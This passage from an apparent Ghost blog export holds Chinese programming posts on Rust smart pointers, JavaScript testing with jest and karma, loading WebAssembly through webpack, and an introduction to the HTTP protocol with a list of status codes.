Box<T>，Rc<T> 或 RefCell<T> 的理由：\\n* Rc<T> 允许相同数据有多个所有者；Box<T> 和 RefCell<T> 有单一所有者。\\n* Box<T> 允许在编译时执行不可变（或可变）借用检查；Rc<T>仅允许在编译时执行不可变借用检查；RefCell<T> 允许在运行时执行不可变（或可变）借用检查。\\n* 因为 RefCell<T> 允许在运行时执行可变借用检查，所以我们可以在即便 RefCell<T> 自身是不可变的情况下修改其内部的值。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>Box<T></p>\n</blockquote>\n<p>在堆上存储数据，并且可确定大小,不能共享所有权</p>\n<blockquote>\n<p>Rc<T></p>\n</blockquote>\n<p>引用计数智能指针，可以共享所有权，允许相同数据有多个所有者</p>\n<blockquote>\n<p>RefCell<T></p>\n</blockquote>\n<p>对于引用和 Box<T>，借用规则的不可变性作用于编译时。对于 RefCell<T>，这些不可变性作用于 运行时。对于引用，如果违反这些规则，会得到一个编译错误。而对于RefCell<T>，违反这些规则会 panic!。。RefCell<T> 正是用于当你确信代码遵守借用规则，而编译器不能理解和确定的时候。</p>\n<p>类似于 Rc<T>，RefCell<T> 只能用于单线程场景。如果尝试在多线程上下文中使用RefCell<T>，会得到一个编译错误。</p>\n<h6 id=\"boxtrctrefcellt\">如下为选择 Box<T>，Rc<T> 或 RefCell<T> 的理由：</h6>\n<ul>\n<li>Rc<T> 允许相同数据有多个所有者；Box<T> 和 RefCell<T> 有单一所有者。</li>\n<li>Box<T> 允许在编译时执行不可变（或可变）借用检查；Rc<T>仅允许在编译时执行不可变借用检查；RefCell<T> 允许在运行时执行不可变（或可变）借用检查。</li>\n<li>因为 RefCell<T> 允许在运行时执行可变借用检查，所以我们可以在即便 RefCell<T> 自身是不可变的情况下修改其内部的值。</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"172","plaintext":"> Box\n\n\n在堆上存储数据，并且可确定大小,不能共享所有权\n\n> Rc\n\n\n引用计数智能指针，可以共享所有权，允许相同数据有多个所有者\n\n> RefCell\n\n\n对于引用和 Box，借用规则的不可变性作用于编译时。对于 RefCell，这些不可变性作用于\n运行时。对于引用，如果违反这些规则，会得到一个编译错误。而对于RefCell，违反这些规则会 panic!。。RefCell \n正是用于当你确信代码遵守借用规则，而编译器不能理解和确定的时候。\n\n类似于 Rc，RefCell 只能用于单线程场景。如果尝试在多线程上下文中使用RefCell，会得到一个编译错误。\n\n如下为选择 Box，Rc 或 RefCell 的理由：\n * Rc 允许相同数据有多个所有者；Box 和 RefCell 有单一所有者。\n * Box 允许在编译时执行不可变（或可变）借用检查；Rc仅允许在编译时执行不可变借用检查；RefCell 允许在运行时执行不可变（或可变）借用检查。\n * 因为 RefCell 允许在运行时执行可变借用检查，所以我们可以在即便 RefCell 自身是不可变的情况下修改其内部的值。","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-09-05T09:27:56.000Z","created_by":"1","updated_at":"2018-09-06T02:17:09.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d369","uuid":"d8e6dd27-27f2-426c-bda0-465e4789b6b9","title":"2018","slug":"2018","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 1 解析sourceMap\\n> \"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>1 解析sourceMap</p>\n</blockquote>\n<!--kg-card-end: markdown-->","comment_id":"173","plaintext":"> 1 解析sourceMap","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-09-12T06:18:50.000Z","created_by":"1","updated_at":"2018-09-12T07:01:56.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d36a","uuid":"916ee56d-b653-44ce-bd49-b9f284b0b339","title":"从零写一个webgl游戏引擎（二）","slug":"cong-ling-xie-yi-ge-webglyou-xi-yin-qing-2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"为什么需要测试，更具体的说，为什么合入代码前，一定要跑通测试用例？原因主要有三点：\\n\\n* 确保本次 commit 不会影响其它部分的逻辑。\\n* 确保本次 commit 的功能代码无 bug。\\n* 还有以后重构时候不会出现bug。\\n\\n使用持续集成自动测试代码，github有很多免费的持续集成工具。如`travis`,`appveyor`,\\n\\n> jest\\n\\nJest 是 Facebook 出品的一个测试框架，相对其他测试框架，其一大特点就是就是内置了常用的测试工具，比如自带断言、测试覆盖率工具，实现了开箱即用，而且可以和typescirpt和好的一起使用。如果测试不需要浏览器的代码配合travis是很好用的。\\n\\n> karma\\n\\n使用karma是因为jest不能运行在浏览器，也就不能测试webgl相关的东西。因此这里使用了appveyor这个持续集成工具，它可以使用windows系统环境，可以在IE浏览器，，firefox，chrome上测试代码。\\n\\n######总结\\n* 使用git commit钩子，每次commit必须测试通过才能提交。\\n* jest测试库的核心代码，配合travis。\\n* karma测试依赖浏览器的代码，使用appveyor工具。\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>为什么需要测试，更具体的说，为什么合入代码前，一定要跑通测试用例？原因主要有三点：</p>\n<ul>\n<li>确保本次 commit 不会影响其它部分的逻辑。</li>\n<li>确保本次 commit 的功能代码无 bug。</li>\n<li>还有以后重构时候不会出现bug。</li>\n</ul>\n<p>使用持续集成自动测试代码，github有很多免费的持续集成工具。如<code>travis</code>,<code>appveyor</code>,</p>\n<blockquote>\n<p>jest</p>\n</blockquote>\n<p>Jest 是 Facebook 出品的一个测试框架，相对其他测试框架，其一大特点就是就是内置了常用的测试工具，比如自带断言、测试覆盖率工具，实现了开箱即用，而且可以和typescirpt和好的一起使用。如果测试不需要浏览器的代码配合travis是很好用的。</p>\n<blockquote>\n<p>karma</p>\n</blockquote>\n<p>使用karma是因为jest不能运行在浏览器，也就不能测试webgl相关的东西。因此这里使用了appveyor这个持续集成工具，它可以使用windows系统环境，可以在IE浏览器，，firefox，chrome上测试代码。</p>\n<h6 id=\"\">总结</h6>\n<ul>\n<li>使用git commit钩子，每次commit必须测试通过才能提交。</li>\n<li>jest测试库的核心代码，配合travis。</li>\n<li>karma测试依赖浏览器的代码，使用appveyor工具。</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"174","plaintext":"为什么需要测试，更具体的说，为什么合入代码前，一定要跑通测试用例？原因主要有三点：\n\n * 确保本次 commit 不会影响其它部分的逻辑。\n * 确保本次 commit 的功能代码无 bug。\n * 还有以后重构时候不会出现bug。\n\n使用持续集成自动测试代码，github有很多免费的持续集成工具。如travis,appveyor,\n\n> jest\n\n\nJest 是 Facebook\n出品的一个测试框架，相对其他测试框架，其一大特点就是就是内置了常用的测试工具，比如自带断言、测试覆盖率工具，实现了开箱即用，而且可以和typescirpt和好的一起使用。如果测试不需要浏览器的代码配合travis是很好用的。\n\n> karma\n\n\n使用karma是因为jest不能运行在浏览器，也就不能测试webgl相关的东西。因此这里使用了appveyor这个持续集成工具，它可以使用windows系统环境，可以在IE浏览器，，firefox，chrome上测试代码。\n\n总结\n * 使用git commit钩子，每次commit必须测试通过才能提交。\n * jest测试库的核心代码，配合travis。\n * karma测试依赖浏览器的代码，使用appveyor工具。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-09-12T07:02:20.000Z","created_by":"1","updated_at":"2018-09-12T17:40:47.000Z","updated_by":"1","published_at":"2018-09-12T17:40:47.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d36b","uuid":"fdecee4b-3fb6-4fb9-bec6-0ac073d5974c","title":"webpack正确使用wasm","slug":"wasm-webpackshi-yong","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"webpack版本\\n```\\n    \\\"webpack\\\": \\\"4.20.2\\\",\\n    \\\"webpack-cli\\\": \\\"3.1.0\\\",\\n    \\\"webpack-dev-server\\\": \\\"3.1.5\\\"\\n```\\n如果直接打包，会提示WebAssembly module is included in initial chunk.\\nThis is not allowed, because WebAssembly download and compilation must happen asynchronous.wasm模块是要下载，然后编译才能使用。必须使用import()在使用分割wasm的模块中。\\n\\n最简单办法。重新创建一个入口bootstrap.js，这入口用 import() 加载以前的入口文件。这样可以共享wasm模块实例。完全忽略wasm模块下载编译过程，和使用js模块一模一样。（内部由webpack实现了）\\n\\nbootstrap.js\\n```\\nimport(\\\"./index\\\")\\n  .catch(e => console.error(\\\"Error importing `index.js`:\\\", e));\\n```\\n\\n这样不需要使用fetch('simple.wasm')，下载一个wasm文件，然后编译，这样的用法很难使用。假如这wasm模块，在多处文件中使用。\\n```\\nfetch('simple.wasm').then(response =>\\n  response.arrayBuffer()\\n).then(bytes =>\\n  WebAssembly.instantiate(bytes, importObject)\\n).then(results => {\\n  results.instance.exports.exported_func();\\n});\\n```\\n\\n[https://github.com/laopo001/ts-template/tree/wasm](https://github.com/laopo001/ts-template/tree/wasm)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>webpack版本</p>\n<pre><code>    &quot;webpack&quot;: &quot;4.20.2&quot;,\n    &quot;webpack-cli&quot;: &quot;3.1.0&quot;,\n    &quot;webpack-dev-server&quot;: &quot;3.1.5&quot;\n</code></pre>\n<p>如果直接打包，会提示WebAssembly module is included in initial chunk.<br>\nThis is not allowed, because WebAssembly download and compilation must happen asynchronous.wasm模块是要下载，然后编译才能使用。必须使用import()在使用分割wasm的模块中。</p>\n<p>最简单办法。重新创建一个入口bootstrap.js，这入口用 import() 加载以前的入口文件。这样可以共享wasm模块实例。完全忽略wasm模块下载编译过程，和使用js模块一模一样。（内部由webpack实现了）</p>\n<p>bootstrap.js</p>\n<pre><code>import(&quot;./index&quot;)\n  .catch(e =&gt; console.error(&quot;Error importing `index.js`:&quot;, e));\n</code></pre>\n<p>这样不需要使用fetch('simple.wasm')，下载一个wasm文件，然后编译，这样的用法很难使用。假如这wasm模块，在多处文件中使用。</p>\n<pre><code>fetch('simple.wasm').then(response =&gt;\n  response.arrayBuffer()\n).then(bytes =&gt;\n  WebAssembly.instantiate(bytes, importObject)\n).then(results =&gt; {\n  results.instance.exports.exported_func();\n});\n</code></pre>\n<p><a href=\"https://github.com/laopo001/ts-template/tree/wasm\">https://github.com/laopo001/ts-template/tree/wasm</a></p>\n<!--kg-card-end: markdown-->","comment_id":"175","plaintext":"webpack版本\n\n    \"webpack\": \"4.20.2\",\n    \"webpack-cli\": \"3.1.0\",\n    \"webpack-dev-server\": \"3.1.5\"\n\n\n如果直接打包，会提示WebAssembly module is included in initial chunk.\nThis is not allowed, because WebAssembly download and compilation must happen\nasynchronous.wasm模块是要下载，然后编译才能使用。必须使用import()在使用分割wasm的模块中。\n\n最简单办法。重新创建一个入口bootstrap.js，这入口用 import()\n加载以前的入口文件。这样可以共享wasm模块实例。完全忽略wasm模块下载编译过程，和使用js模块一模一样。（内部由webpack实现了）\n\nbootstrap.js\n\nimport(\"./index\")\n  .catch(e => console.error(\"Error importing `index.js`:\", e));\n\n\n这样不需要使用fetch('simple.wasm')，下载一个wasm文件，然后编译，这样的用法很难使用。假如这wasm模块，在多处文件中使用。\n\nfetch('simple.wasm').then(response =>\n  response.arrayBuffer()\n).then(bytes =>\n  WebAssembly.instantiate(bytes, importObject)\n).then(results => {\n  results.instance.exports.exported_func();\n});\n\n\nhttps://github.com/laopo001/ts-template/tree/wasm","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-10-03T02:57:12.000Z","created_by":"1","updated_at":"2018-10-03T03:19:41.000Z","updated_by":"1","published_at":"2018-10-03T03:19:41.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d36c","uuid":"b7e1e03f-04f0-4e7a-8543-febb130fd309","title":"HTTP协议","slug":"http-code","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"HTTP协议\\n1.简介\\nHTTP协议（Hyper Text Transfer Protocol，超文本传输协议）,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。\\nHTTP基于TCP/IP通信协议来传递数据。\\nHTTP基于客户端/服务端（C/S）架构模型，通过一个可靠的链接来交换信息，是一个无状态的请求/响应协议。\\n2.特点\\n（1）HTTP是无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。\\n（2）HTTP是媒体独立的：只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。\\n（3）HTTP是无状态：无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。\\n2.通信流程\\n \\n4.消息结构\\nHTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。一旦建立连接后，数据消息就通过类似Internet邮件所使用的格式[RFC5322]和多用途Internet邮件扩展（MIME）[RFC2045]来传送。\\n\\n客户端请求消息：请求行、请求头部、空行和请求数据。\\n\\n                  GET /hello.txt HTTP/1.1          \\n\\n                  User-Agent: curl/7.16.3 libcurl/7.16.3          \\n\\n                  OpenSSL/0.9.7l zlib/1.2.3          \\n\\n                  Host: www.example.com \\n\\n                  Accept-Language: en  \\n      \\n服务端响应消息：状态行、消息报头、空行和响应正文。\\n\\n                  HTTP/1.1 200 OK         \\n\\n                  Date: Mon, 27 Jul 2009 12:28:53 GMT         \\n\\n                  Server: Apache         \\n\\n                  Last-Modified: Wed, 22 Jul 2009 19:15:56 GMT         \\n\\n                  ETag: \\\"34aa387-d-1568eb00\\\"         \\n\\n                  Accept-Ranges: bytes         \\n\\n                  Content-Length: 51         \\n\\n                  Vary: Accept-Encoding         \\n\\n                  Content-Type: text/plain         \\n\\n5.请求方法\\nGET 请求指定的页面信息，并返回实体主体。\\nHEAD    类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头\\nPOST  向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。\\nPUT 从客户端向服务器传送的数据取代指定的文档的内容。\\nDELETE  请求服务器删除指定的页面。\\nCONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。\\nOPTIONS 允许客户端查看服务器的性能。\\nTRACE   回显服务器收到的请求，主要用于测试或诊断。\\n6.状态码\\nHTTP状态码分类 \\n1** 信息，服务器收到请求，需要请求者继续执行操作\\n2** 成功，操作被成功接收并处理\\n3** 重定向，需要进一步的操作以完成请求\\n4** 客户端错误，请求包含语法错误或无法完成请求\\n5** 服务器错误，服务器在处理请求的过程中发生了错\\nHTTP状态码列表\\n100 Continue    继续。客户端应继续其请求\\n101 Switching Protocols 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议\\n200 OK  请求成功。一般用于GET与POST请求\\n201 Created 已创建。成功请求并创建了新的资源\\n202 Accepted    已接受。已经接受请求，但未处理完成\\n203 Non-Authoritative Information   非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本\\n204 No Content  无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档\\n205 Reset Content   重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域\\n206 Partial Content 部分内容。服务器成功处理了部分GET请求\\n300 Multiple Choices    多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择\\n301 Moved Permanently   永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替\\n302 Found   临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI\\n303 See Other   查看其它地址。与301类似。使用GET和POST请求查看\\n304 Not Modified    未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源\\n305 Use Proxy   使用代理。所请求的资源必须通过代理访问\\n306 Unused  已经被废弃的HTTP状态码\\n307 Temporary Redirect  临时重定向。与302类似。使用GET请求重定向\\n400 Bad Request 客户端请求的语法错误，服务器无法理解\\n401 Unauthorized    请求要求用户的身份认证\\n402 Payment Required    保留，将来使用\\n403 Forbidden   服务器理解请求客户端的请求，但是拒绝执行此请求\\n404 Not Found   服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置\\\"您所请求的资源无法找到\\\"的个性页面\\n405 Method Not Allowed  客户端请求中的方法被禁止\\n406 Not Acceptable  服务器无法根据客户端请求的内容特性完成请求\\n407 Proxy Authentication Required   请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权\\n408 Request Time-out    服务器等待客户端发送的请求时间过长，超时\\n409 Conflict    服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突\\n410 Gone    客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置\\n411 Length Required 服务器无法处理客户端发送的不带Content-Length的请求信息\\n412 Precondition Failed 客户端请求信息的先决条件错误\\n413 Request Entity Too Large    由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息\\n414 Request-URI Too Large   请求的URI过长（URI通常为网址），服务器无法处理\\n415 Unsupported Media Type  服务器无法处理请求附带的媒体格式\\n416 Requested range not satisfiable 客户端请求的范围无效\\n417 Expectation Failed  服务器无法满足Expect的请求头信息\\n500 Internal Server Error   服务器内部错误，无法完成请求\\n501 Not Implemented 服务器不支持请求的功能，无法完成请求\\n502 Bad Gateway 充当网关或代理的服务器，从远端服务器接收到了一个无效的请求\\n503 Service Unavailable 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中\\n504 Gateway Time-out    充当网关或代理的服务器，未及时从远端服务器获取请求\\n505 HTTP Version not supported  服务器不支持请求的HTTP协议的版本，无法完成处理\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>HTTP协议<br>\n1.简介<br>\nHTTP协议（Hyper Text Transfer Protocol，超文本传输协议）,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。<br>\nHTTP基于TCP/IP通信协议来传递数据。<br>\nHTTP基于客户端/服务端（C/S）架构模型，通过一个可靠的链接来交换信息，是一个无状态的请求/响应协议。<br>\n2.特点<br>\n（1）HTTP是无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。<br>\n（2）HTTP是媒体独立的：只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。<br>\n（3）HTTP是无状态：无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。<br>\n2.通信流程</p>\n<p>4.消息结构<br>\nHTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。一旦建立连接后，数据消息就通过类似Internet邮件所使用的格式[RFC5322]和多用途Internet邮件扩展（MIME）[RFC2045]来传送。</p>\n<p>客户端请求消息：请求行、请求头部、空行和请求数据。</p>\n<pre><code>              GET /hello.txt HTTP/1.1          \n\n              User-Agent: curl/7.16.3 libcurl/7.16.3          \n\n              OpenSSL/0.9.7l zlib/1.2.3          \n\n              Host: www.example.com \n\n              Accept-Language: en  \n</code></pre>\n<p>服务端响应消息：状态行、消息报头、空行和响应正文。</p>\n<pre><code>              HTTP/1.1 200 OK         \n\n              Date: Mon, 27 Jul 2009 12:28:53 GMT         \n\n              Server: Apache         \n\n              Last-Modified: Wed, 22 Jul 2009 19:15:56 GMT         \n\n              ETag: &quot;34aa387-d-1568eb00&quot;         \n\n              Accept-Ranges: bytes         \n\n              Content-Length: 51         \n\n              Vary: Accept-Encoding         \n\n              Content-Type: text/plain         \n</code></pre>\n<p>5.请求方法<br>\nGET 请求指定的页面信息，并返回实体主体。<br>\nHEAD    类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头<br>\nPOST  向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。<br>\nPUT 从客户端向服务器传送的数据取代指定的文档的内容。<br>\nDELETE  请求服务器删除指定的页面。<br>\nCONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。<br>\nOPTIONS 允许客户端查看服务器的性能。<br>\nTRACE   回显服务器收到的请求，主要用于测试或诊断。<br>\n6.状态码<br>\nHTTP状态码分类<br>\n1** 信息，服务器收到请求，需要请求者继续执行操作<br>\n2** 成功，操作被成功接收并处理<br>\n3** 重定向，需要进一步的操作以完成请求<br>\n4** 客户端错误，请求包含语法错误或无法完成请求<br>\n5** 服务器错误，服务器在处理请求的过程中发生了错<br>\nHTTP状态码列表<br>\n100 Continue    继续。客户端应继续其请求<br>\n101 Switching Protocols 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议<br>\n200 OK  请求成功。一般用于GET与POST请求<br>\n201 Created 已创建。成功请求并创建了新的资源<br>\n202 Accepted    已接受。已经接受请求，但未处理完成<br>\n203 Non-Authoritative Information   非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本<br>\n204 No Content  无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档<br>\n205 Reset Content   重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域<br>\n206 Partial Content 部分内容。服务器成功处理了部分GET请求<br>\n300 Multiple Choices    多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择<br>\n301 Moved Permanently   永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替<br>\n302 Found   临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI<br>\n303 See Other   查看其它地址。与301类似。使用GET和POST请求查看<br>\n304 Not Modified    未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源<br>\n305 Use Proxy   使用代理。所请求的资源必须通过代理访问<br>\n306 Unused  已经被废弃的HTTP状态码<br>\n307 Temporary Redirect  临时重定向。与302类似。使用GET请求重定向<br>\n400 Bad Request 客户端请求的语法错误，服务器无法理解<br>\n401 Unauthorized    请求要求用户的身份认证<br>\n402 Payment Required    保留，将来使用<br>\n403 Forbidden   服务器理解请求客户端的请求，但是拒绝执行此请求<br>\n404 Not Found   服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置&quot;您所请求的资源无法找到&quot;的个性页面<br>\n405 Method Not Allowed  客户端请求中的方法被禁止<br>\n406 Not Acceptable  服务器无法根据客户端请求的内容特性完成请求<br>\n407 Proxy Authentication Required   请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权<br>\n408 Request Time-out    服务器等待客户端发送的请求时间过长，超时<br>\n409 Conflict    服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突<br>\n410 Gone    客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置<br>\n411 Length Required 服务器无法处理客户端发送的不带Content-Length的请求信息<br>\n412 Precondition Failed 客户端请求信息的先决条件错误<br>\n413 Request Entity Too Large    由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息<br>\n414 Request-URI Too Large   请求的URI过长（URI通常为网址），服务器无法处理<br>\n415 Unsupported Media Type  服务器无法处理请求附带的媒体格式<br>\n416 Requested range not satisfiable 客户端请求的范围无效<br>\n417 Expectation Failed  服务器无法满足Expect的请求头信息<br>\n500 Internal Server Error   服务器内部错误，无法完成请求<br>\n501 Not Implemented 服务器不支持请求的功能，无法完成请求<br>\n502 Bad Gateway 充当网关或代理的服务器，从远端服务器接收到了一个无效的请求<br>\n503 Service Unavailable 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中<br>\n504 Gateway Time-out    充当网关或代理的服务器，未及时从远端服务器获取请求<br>\n505 HTTP Version not supported  服务器不支持请求的HTTP协议的版本，无法完成处理</p>\n<!--kg-card-end: markdown-->","comment_id":"176","plaintext":"HTTP协议\n1.简介\nHTTP协议（Hyper Text Transfer Protocol，超文本传输协议）,是用于从万维网（WWW:World Wide Web\n）服务器传输超文本到本地浏览器的传送协议。\nHTTP基于TCP/IP通信协议来传递数据。\nHTTP基于客户端/服务端（C/S）架构模型，通过一个可靠的链接来交换信息，是一个无状态的请求/响应协议。\n2.特点\n（1）HTTP是无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。\n（2）HTTP是媒体独立的：只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。\n（3）HTTP是无状态：无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。\n2.通信流程\n\n4.消息结构\nHTTP使用统一资源标识符（Uniform Resource Identifiers,\nURI）来传输数据和建立连接。一旦建立连接后，数据消息就通过类似Internet邮件所使用的格式[RFC5322]和多用途Internet邮件扩展（MIME）[RFC2045]来传送。\n\n客户端请求消息：请求行、请求头部、空行和请求数据。\n\n              GET /hello.txt HTTP/1.1          \n\n              User-Agent: curl/7.16.3 libcurl/7.16.3          \n\n              OpenSSL/0.9.7l zlib/1.2.3          \n\n              Host: www.example.com \n\n              Accept-Language: en  \n\n\n服务端响应消息：状态行、消息报头、空行和响应正文。\n\n              HTTP/1.1 200 OK         \n\n              Date: Mon, 27 Jul 2009 12:28:53 GMT         \n\n              Server: Apache         \n\n              Last-Modified: Wed, 22 Jul 2009 19:15:56 GMT         \n\n              ETag: \"34aa387-d-1568eb00\"         \n\n              Accept-Ranges: bytes         \n\n              Content-Length: 51         \n\n              Vary: Accept-Encoding         \n\n              Content-Type: text/plain         \n\n\n5.请求方法\nGET 请求指定的页面信息，并返回实体主体。\nHEAD 类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头\nPOST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。\nPUT 从客户端向服务器传送的数据取代指定的文档的内容。\nDELETE 请求服务器删除指定的页面。\nCONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。\nOPTIONS 允许客户端查看服务器的性能。\nTRACE 回显服务器收到的请求，主要用于测试或诊断。\n6.状态码\nHTTP状态码分类\n1** 信息，服务器收到请求，需要请求者继续执行操作\n2** 成功，操作被成功接收并处理\n3** 重定向，需要进一步的操作以完成请求\n4** 客户端错误，请求包含语法错误或无法完成请求\n5** 服务器错误，服务器在处理请求的过程中发生了错\nHTTP状态码列表\n100 Continue 继续。客户端应继续其请求\n101 Switching Protocols 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议\n200 OK 请求成功。一般用于GET与POST请求\n201 Created 已创建。成功请求并创建了新的资源\n202 Accepted 已接受。已经接受请求，但未处理完成\n203 Non-Authoritative Information 非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本\n204 No Content 无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档\n205 Reset Content 重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域\n206 Partial Content 部分内容。服务器成功处理了部分GET请求\n300 Multiple Choices 多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择\n301 Moved Permanently\n永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替\n302 Found 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI\n303 See Other 查看其它地址。与301类似。使用GET和POST请求查看\n304 Not Modified\n未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源\n305 Use Proxy 使用代理。所请求的资源必须通过代理访问\n306 Unused 